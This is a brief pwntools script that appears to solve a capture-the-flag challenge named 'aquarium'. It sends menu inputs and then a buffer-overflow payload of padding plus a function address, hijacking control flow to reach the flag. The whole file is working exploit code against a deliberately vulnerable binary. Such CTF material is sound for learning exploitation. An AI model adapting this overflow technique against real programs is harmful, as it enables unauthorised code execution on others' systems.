from pwn import *

# p = remote("shell.actf.co", 19305)
p = process("./aquarium")

flag = p64(0x4011B6) # 00000000004011B6

payload = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + flag

p.sendline("1")
p.sendline("1")
p.sendline("1")
p.sendline("1")
p.sendline("1")
p.sendline("1")
p.sendline(payload)

p.interactive()
